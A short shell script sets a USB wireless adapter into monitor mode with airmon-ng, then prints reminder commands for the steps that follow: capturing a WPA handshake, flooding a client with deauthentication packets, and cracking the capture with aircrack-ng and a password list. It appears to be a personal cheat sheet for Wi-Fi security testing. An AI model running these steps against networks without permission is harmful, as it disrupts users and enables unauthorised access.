#! /bin/sh
# from guidance at github.com/aircrack-ng/rtl8188eus
#  using airmon-ng flavour module for USB TP Link 827 (? check number)
sudo airmon-ng check kill
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo airmon-ng start wlan0 #to start monitor mode
echo .
echo "Done - now run: airodump-ng wlan0 (for scanning clients/APs); airodump-ng -c CHAN --bssid MAC -w PSK wlan0"
echo "deauth is: aireplay-ng --deauth 0 -c TARGETMAC -a APMAC wlan0"
echo "cracking by: aircrack-ng -a2 -b CC:2D:21:08:46:29 -c -w vulnerability_assessment_free_passwords.txt PSK-02.cap"
echo .
